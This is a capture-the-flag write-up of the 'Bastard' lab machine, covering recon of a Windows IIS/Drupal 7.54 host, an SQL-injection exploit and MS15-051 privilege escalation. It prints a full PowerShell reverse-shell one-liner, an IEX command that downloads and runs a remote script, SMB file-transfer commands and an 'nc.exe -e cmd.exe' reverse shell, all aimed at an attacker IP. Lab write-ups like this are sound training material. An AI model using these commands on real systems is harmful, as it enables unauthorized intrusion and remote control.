Bastard

Recon​

Ping​

We have a TTL of 127, which means this is likely a Windows machine.

Nmap​

First 1000 TCP Ports​

Web Service on port 80​

The server is running Microsoft IIS httpd version 7.5, which likely indicates Windows 7 or Windows Server 2008.

The web server hosts a CMS called Drupal. According to the Nmap report, robots.txt reveals some interesting files.

Enumeration​

Among these files is CHANGELOG.txt:

It reveals the Drupal version: 7.54. Let's Google that.

There's an article by AMBIONICS with a PoC exploit for this exact version.

Exploitation​

Injection​

The vulnerability is an SQL injection via manipulated headers and content-type abuse. The PoC uses PHP and requires php-curl.

sudo apt install php-curl

After modifying it, we got:

  • URL changed to the correct one
  • Endpoint path found via ffuf
  • Payload set to a simple OS command execution

We ran the exploit:

Note: You can also escalate via Drupal admin credentials, but both paths work.

It worked! Let’s get a shell:

Using this PowerShell payload (URL-encoded in Burp):

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.3',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

We got a reverse shell.

User Flag​

Privilege Escalation​

Before automated tools, we ran:

  • whoami /priv
  • systeminfo

No hotfixes/service packs — worth checking Sherlock.ps1:

  • Tool: Sherlock.ps1
  • Use function Find-AllVulns

Execute from victim via hosted Python HTTP server:

IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3:1111/Sherlock.ps1')

We see potential for MS15-051 — it worked for us previously.

We found executables here: GitHub - MS15-051 Exploit

Transfer using SMB:

Attacker​

sudo impacket-smbserver share -smb2support /tmp/smbshare/

Victim​

copy \\10.10.16.3\share\ms15-051x64.exe

Root Flag​

Exploit works! Let’s execute a reverse shell via nc.exe:

 .\ms15-051x64.exe "\\10.10.16.3\share\nc.exe -e cmd.exe 10.10.16.3 1338"
